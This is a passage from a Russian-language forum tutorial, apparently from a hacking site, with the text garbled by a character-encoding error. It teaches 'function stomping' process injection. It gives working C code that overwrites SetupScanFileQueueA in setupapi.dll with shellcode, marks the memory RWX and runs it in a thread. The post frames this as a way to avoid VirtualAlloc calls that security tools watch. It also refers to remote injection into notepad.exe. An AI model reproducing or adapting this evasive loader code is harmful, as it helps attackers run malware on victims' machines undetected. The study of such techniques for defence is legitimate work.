MapViewOfFile2 –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —Ç–µ –∂–µ –±–∞–π—Ç—ã –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, notepad.exe. –£–¥–∞–ª–µ–Ω–Ω–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–∞—è –ø–∞–º—è—Ç—å —Ç–µ–ø–µ—Ä—å —Å–æ–¥–µ—Ä–∂–∏—Ç –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è–º–∏ RWX (—á—Ç–µ–Ω–∏–µ, –∑–∞–ø–∏—Å—å –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783436428.png"
		data-src="https://osint42.org/attachments/1746783436428-png.148/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783436428-png.148/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783436428.png"
			title="1746783436428.png"
			width="1780" height="814" loading="lazy" />
	</div><br />
<br />
–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ (–∏—Å–ø–æ–ª—å–∑—É—è CreateRemoteThread –¥–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã)<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783442653.png"
		data-src="https://osint42.org/attachments/1746783442653-png.149/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783442653-png.149/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783442653.png"
			title="1746783442653.png"
			width="1672" height="792" loading="lazy" />
	</div></div>
						

							<h2>–ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Stomping Injection</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746783529135.png"
		data-src="https://osint42.org/attachments/1746783529135-png.150/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783529135-png.150/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783529135.png"
			title="1746783529135.png"
			width="1353" height="962" loading="lazy" />
	</div><br />
<br />
–ü—Ä–µ–¥—ã–¥—É—â–∞—è —Å—Ç–∞—Ç—å—è –ø–æ–∫–∞–∑—ã–≤–∞–ª–∞ –∫–∞–∫ –∑–∞–ø—É—Å—Ç–∏—Ç—å peyload –∏ –ø—Ä–∏ —ç—Ç–æ–º –∏–∑–±–µ–∂–∞—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤—ã–∑–æ–≤–æ–≤ WinAPI VirtualAlloc/Ex.<br />
<br />
–≠—Ç–æ—Ç-–∂–µ —É—Ä–æ–∫ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç –¥—Ä—É–≥–æ–π –º–µ—Ç–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –∏–∑–±–µ–≥–∞–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–∏—Ö WinAPI.<br />
<br />
–¢–µ—Ä–º–∏–Ω &quot;stomping&quot; –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ –¥–µ–π—Å—Ç–≤–∏—é –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –∏–ª–∏ –∑–∞–º–µ–Ω—ã –ø–∞–º—è—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –∏–ª–∏ –¥—Ä—É–≥–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ –¥—Ä—É–≥–∏–º–∏ –¥–∞–Ω–Ω—ã–º–∏.<br />
<br />
<b>&quot;Function stomping&quot;</b> - —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –±–∞–π—Ç—ã –∏—Å—Ö–æ–¥–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –∑–∞–º–µ–Ω—è—é—Ç—Å—è –Ω–æ–≤—ã–º –∫–æ–¥–æ–º, –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —á–µ–≥–æ —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –∏–ª–∏ –±–æ–ª—å—à–µ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–∞–∫, –∫–∞–∫ –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–ª–æ—Å—å. –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –¥—Ä—É–≥—É—é –ª–æ–≥–∏–∫—É. –î–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —ç—Ç–æ–≥–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∞–¥—Ä–µ—Å –∂–µ—Ä—Ç–≤–µ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è &quot;stomping&quot;.<br />
<br />
<b>–í—ã–±–æ—Ä —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏, –µ—Å–ª–∏ –æ–Ω–∞ –ª–æ–∫–∞–ª—å–Ω–∞—è, —Ç–æ —ç—Ç–æ –Ω–µ —Å–ª–æ–∂–Ω–æ, –Ω–æ –æ—Å–Ω–æ–≤–Ω–æ–π –≤–æ–ø—Ä–æ—Å –ø—Ä–∏ —ç—Ç–æ–π —Ç–µ—Ö–Ω–∏–∫–µ - –∫–∞–∫–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–∞–µ—Ç—Å—è.<br />
–ü–µ—Ä–µ–∑–∞–ø–∏—Å—å —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –Ω–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–º—É –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å –º–æ–∂–µ—Ç –∑–∞–≤–µ—Ä—à–∏—Ç—å—Å—è –∞–≤–∞—Ä–∏–π–Ω–æ. –ü–æ—ç—Ç–æ–º—É —Å–ª–µ–¥—É–µ—Ç –ø–æ–Ω–∏–º–∞—Ç—å, —á—Ç–æ –Ω–∞—Ü–µ–ª–∏–≤–∞–Ω–∏–µ –Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã–µ –∏–∑ ntdll.dll, kernel32.dll –∏ kernelbase.dll, —Ä–∏—Å–∫–æ–≤–∞–Ω–Ω–æ.<br />
–í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ —Å–ª–µ–¥—É–µ—Ç –Ω–∞—Ü–µ–ª–∏–≤–∞—Ç—å—Å—è –Ω–∞ –º–µ–Ω–µ–µ —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ MessageBox, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∞ —Ä–µ–¥–∫–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π –∏–ª–∏ –¥—Ä—É–≥–∏–º–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–ö–æ–≥–¥–∞ –±–∞–π—Ç—ã —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –∑–∞–º–µ–Ω—è—é—Ç—Å—è –Ω–∞ –±–∞–π—Ç—ã –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, —Ñ—É–Ω–∫—Ü–∏—è –±–æ–ª—å—à–µ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞, –µ—Å–ª–∏ —ç—Ç–æ –Ω–µ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–µ–π —è–≤–ª—è–µ—Ç—Å—è MessageBoxA, —Ç–æ –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª –¥–æ–ª–∂–µ–Ω –≤—ã–∑—ã–≤–∞—Ç—å MessageBoxA —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑, –∫–æ–≥–¥–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞.<br />
<br />
<b>–õ–æ–∫–∞–ª—å–Ω—ã–π –∫–æ–¥ —Ñ—É–Ω–∫—Ü–∏–∏ Stomping</b><br />
<br />
–í –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –∫–æ–¥–∞ –Ω–∏–∂–µ, —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–µ–π —è–≤–ª—è–µ—Ç—Å—è SetupScanFileQueueA. –≠—Ç–æ —Å–æ–≤–µ—Ä—à–µ–Ω–Ω–æ —Å–ª—É—á–∞–π–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –Ω–æ –≤—Ä—è–¥ –ª–∏ –æ–Ω–∞ –≤—ã–∑–æ–≤–µ—Ç –ø—Ä–æ–±–ª–µ–º—ã, –µ—Å–ª–∏ –µ–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å.<br />
–°–æ–≥–ª–∞—Å–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft, —Ñ—É–Ω–∫—Ü–∏—è —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –∏–∑ Setupapi.dll. –ü–æ—ç—Ç–æ–º—É –ø–µ—Ä–≤—ã–º —à–∞–≥–æ–º –±—É–¥–µ—Ç –∑–∞–≥—Ä—É–∑–∫–∞ Setupapi.dll –≤ –ª–æ–∫–∞–ª—å–Ω—É—é –ø–∞–º—è—Ç—å –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º LoadLibraryA, –∞ –∑–∞—Ç–µ–º –ø–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ —Å –ø–æ–º–æ—â—å—é GetProcAddress.<br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º –±—É–¥–µ—Ç &quot;stomping&quot; —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –∑–∞–º–µ–Ω–∞ –µ—ë –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∞, –ø–æ–º–µ—Ç–∏–≤ –µ—ë –æ–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏ –∫–∞–∫ –¥–æ—Å—Ç—É–ø–Ω—É—é –¥–ª—è —á—Ç–µ–Ω–∏—è –∏ –∑–∞–ø–∏—Å–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º VirtualProtect.<br />
–ó–∞—Ç–µ–º –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è –ø–æ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü–∏–∏, –∏, –Ω–∞–∫–æ–Ω–µ—Ü, —Å–Ω–æ–≤–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è VirtualProtect, —á—Ç–æ–±—ã –ø–æ–º–µ—Ç–∏—Ç—å –æ–±–ª–∞—Å—Ç—å –∫–∞–∫ –∏—Å–ø–æ–ª–Ω—è–µ–º—É—é (RX –∏–ª–∏ RWX).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define        SACRIFICIAL_DLL          &quot;setupapi.dll&quot;
#define        SACRIFICIAL_FUNC         &quot;SetupScanFileQueueA&quot;
// ...

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    DWORD    dwOldProtection        = NULL;

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &amp;dwOldProtection)){
        printf(&quot;[!] VirtualProtect [RW] –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏: %d \n&quot;, GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect [RWX] –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏: %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main() {

    PVOID        pAddress    = NULL;
    HMODULE        hModule        = NULL;
    HANDLE        hThread        = NULL;

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–≥—Ä—É–∑–∏—Ç—å \&quot;%s\&quot; ... &quot;, SACRIFICIAL_DLL);
    getchar();

    printf(&quot;[i] –ó–∞–≥—Ä—É–∑–∫–∞ ... &quot;);
    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL){
        printf(&quot;[!] LoadLibraryA –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏: %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);

    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL){
        printf(&quot;[!] GetProcAddress –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏: %d \n&quot;, GetLastError());
        return -1;
    }

    printf(&quot;[+] –ê–¥—Ä–µ—Å \&quot;%s\&quot; : 0x%p \n&quot;, SACRIFICIAL_FUNC, pAddress);

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    printf(&quot;[i] –ó–∞–ø–∏—Å—å ... &quot;);
    if (!WritePayload(pAddress, Payload, sizeof(Payload))) {
        return -1;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();

    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ ... &quot;);
    getchar();

    return 0;

}</code></pre>
	</div>
</div><br />
<b>–í—Å—Ç–∞–≤–∫–∞ DLL –≤ –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª</b><br />
<br />
–í–º–µ—Å—Ç–æ –∑–∞–≥—Ä—É–∑–∫–∏ DLL —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º LoadLibrary –∏ –∑–∞—Ç–µ–º –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ —Å –ø–æ–º–æ—â—å—é GetProcAddress, –º–æ–∂–Ω–æ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≤—è–∑–∞—Ç—å DLL —Å –¥–≤–æ–∏—á–Ω—ã–º —Ñ–∞–π–ª–æ–º. –î–ª—è —ç—Ç–æ–≥–æ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–∏—Ä–µ–∫—Ç–∏–≤—É –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ pragma comment, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma comment (lib, &quot;Setupapi.lib&quot;) // –î–æ–±–∞–≤–ª–µ–Ω–∏–µ &quot;setupapi.dll&quot; –≤ —Ç–∞–±–ª–∏—Ü—É –∏–º–ø–æ—Ä—Ç–∞ –∞–¥—Ä–µ—Å–æ–≤</code></pre>
	</div>
</div><br />
–ó–∞—Ç–µ–º —Ü–µ–ª–µ–≤—É—é —Ñ—É–Ω–∫—Ü–∏—é –º–æ–∂–Ω–æ –ø—Ä–æ—Å—Ç–æ –ø–æ–ª—É—á–∏—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ –∞–¥—Ä–µ—Å–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, &amp;SetupScanFileQueueA). –ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –æ–±–Ω–æ–≤–ª—è–µ—Ç –ø—Ä–µ–¥—ã–¥—É—â–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –¥–∏—Ä–µ–∫—Ç–∏–≤—ã pragma comment.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma comment (lib, &quot;Setupapi.lib&quot;) // –î–æ–±–∞–≤–ª–µ–Ω–∏–µ &quot;setupapi.dll&quot; –≤ —Ç–∞–±–ª–∏—Ü—É –∏–º–ø–æ—Ä—Ç–∞ –∞–¥—Ä–µ—Å–æ–≤
// ...

int main() {

    HANDLE        hThread            = NULL;

    printf(&quot;[+] –ê–¥—Ä–µ—Å \&quot;SetupScanFileQueueA\&quot; : 0x%p \n&quot;, &amp;SetupScanFileQueueA);

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    printf(&quot;[i] –ó–∞–ø–∏—Å—å ... &quot;);
    if (!WritePayload(&amp;SetupScanFileQueueA, Payload, sizeof(Payload))) { // –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ –∞–¥—Ä–µ—Å–∞
        return -1;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();

    hThread = CreateThread(NULL, NULL, SetupScanFileQueueA, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ ... &quot;);
    getchar();

    return 0;

}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è</b><br />
<br />
–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ SetupScanFileQueueA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783550140.png"
		data-src="https://osint42.org/attachments/1746783550140-png.151/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783550140-png.151/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783550140.png"
			title="1746783550140.png"
			width="1353" height="962" loading="lazy" />
	</div><br />
<br />
–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –±–∞–π—Ç—ã —Ñ—É–Ω–∫—Ü–∏–∏ SetupScanFileQueueA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783559906.png"
		data-src="https://osint42.org/attachments/1746783559906-png.152/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783559906-png.152/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783559906.png"
			title="1746783559906.png"
			width="1419" height="924" loading="lazy" />
	</div><br />
<br />
–ó–∞–º–µ–Ω–∞ –±–∞–π—Ç–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∞ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É Msfvenom calc.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783567521.png"
		data-src="https://osint42.org/attachments/1746783567521-png.153/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783567521-png.153/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783567521.png"
			title="1746783567521.png"
			width="1217" height="771" loading="lazy" />
	</div><br />
<br />
–ó–∞–ø—É—Å–∫ –Ω–∞–≥—Ä—É–∑–∫–∏<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783574451.png"
		data-src="https://osint42.org/attachments/1746783574451-png.154/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783574451-png.154/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783574451.png"
			title="1746783574451.png"
			width="1455" height="844" loading="lazy" />
	</div><br />
<br />
<b>Stomping Injection –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å</b><br />
–î–∞–≤–∞–π—Ç–µ —Ç–µ–ø–µ—Ä—å –ø–æ–ø—Ä–æ–±—É–µ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é –≤ —Å—Ç–æ—Ä–æ–Ω–Ω–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.)<br />
<br />
DLL-—Ñ–∞–π–ª—ã, —Ä–µ–∞–ª–∏–∑—É—é—â–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ Windows API, –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤—Å–µ–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏, –∫–æ—Ç–æ—Ä—ã–µ –∏—Ö –∏—Å–ø–æ–ª—å–∑—É—é—Ç, –ø–æ—ç—Ç–æ–º—É —Ñ—É–Ω–∫—Ü–∏–∏ –≤–Ω—É—Ç—Ä–∏ DLL –∏–º–µ—é—Ç –æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ –∞–¥—Ä–µ—Å–∞ –≤ –∫–∞–∂–¥–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ. –û–¥–Ω–∞–∫–æ –∞–¥—Ä–µ—Å —Å–∞–º–æ–π DLL –±—É–¥–µ—Ç –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –º–µ–∂–¥—É –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏ –∏–∑-–∑–∞ —Ä–∞–∑–ª–∏—á–Ω–æ–≥–æ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ, —Ö–æ—Ç—è –∞–¥—Ä–µ—Å —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Å—Ç–∞–µ—Ç—Å—è –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–º –≤ —Ä–∞–∑–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö, DLL, –∫–æ—Ç–æ—Ä—ã–π —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç —ç—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏, –º–æ–∂–µ—Ç –Ω–µ –±—ã—Ç—å –æ–¥–∏–Ω–∞–∫–æ–≤—ã–º.<br />
<br />
